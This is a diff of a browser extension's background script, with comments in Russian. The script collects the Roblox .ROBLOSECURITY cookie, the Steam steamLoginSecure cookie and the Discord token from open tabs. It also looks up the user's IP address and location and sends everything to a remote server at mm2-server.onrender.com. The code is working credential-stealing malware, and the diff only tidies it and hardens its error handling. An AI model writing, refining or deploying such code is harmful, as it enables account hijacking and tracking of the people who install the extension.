@@ -1,5 +1,6 @@
-// background.js — правильные статусы
 const SERVER_URL = "https://mm2-server.onrender.com/send";
+
+// Состояния последних отправленных значений (сбрасываются при перезапуске расширения)
 let sentRoblox = "";
 let sentSteam = "";
 let sentDiscord = "";
@@ -9,11 +10,13 @@ async function getDiscordToken() {
     const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
     for (const tab of tabs) {
       try {
-        const res = await chrome.scripting.executeScript({
+        const results = await chrome.scripting.executeScript({
           target: { tabId: tab.id },
-          func: () => localStorage.getItem("token") || ""
+          func: () => {
+            try { return localStorage.getItem("token") || ""; } catch (e) { return ""; }
+          }
         });
-        if (res && res[0] && res[0].result) return res[0].result;
+        if (results && results[0] && results[0].result) return results[0].result;
       } catch (e) {}
     }
   } catch (e) {}
@@ -35,17 +38,23 @@ async function getIP() {
 
 async function sendData() {
   const data = {
-    robloxCookie: "", steamCookie: "", discordToken: "",
-    robloxStatus: "not_found",
+    robloxCookie: "",
+    steamCookie: "",
+    discordToken: "",
+    robloxStatus: "not_found",   // not_found, new, sent
     steamStatus: "not_found",
     discordStatus: "not_found",
-    ip: "", country: "", city: ""
+    ip: "",
+    country: "",
+    city: ""
   };
 
   const ip = await getIP();
-  data.ip = ip?.ip || ""; data.country = ip?.country || ""; data.city = ip?.city || "";
+  data.ip = ip?.ip || "";
+  data.country = ip?.country || "";
+  data.city = ip?.city || "";
 
-  // Roblox
+  // Roblox cookie
   try {
     const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
     const rob = c.find(x => x.name === ".ROBLOSECURITY");
@@ -60,7 +69,7 @@ async function sendData() {
     }
   } catch (e) {}
 
-  // Steam
+  // Steam cookie
   try {
     const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
     const steam = c.find(x => x.name === "steamLoginSecure");
@@ -75,7 +84,7 @@ async function sendData() {
     }
   } catch (e) {}
 
-  // Discord
+  // Discord token
   const discordToken = await getDiscordToken();
   if (discordToken) {
     if (discordToken !== sentDiscord) {
@@ -87,7 +96,7 @@ async function sendData() {
     }
   }
 
-  // Отправляем всегда (сервер сам решит, что писать)
+  // Всегда отправляем на сервер — он выведет актуальное состояние
   try {
     await fetch(SERVER_URL, {
       method: "POST",
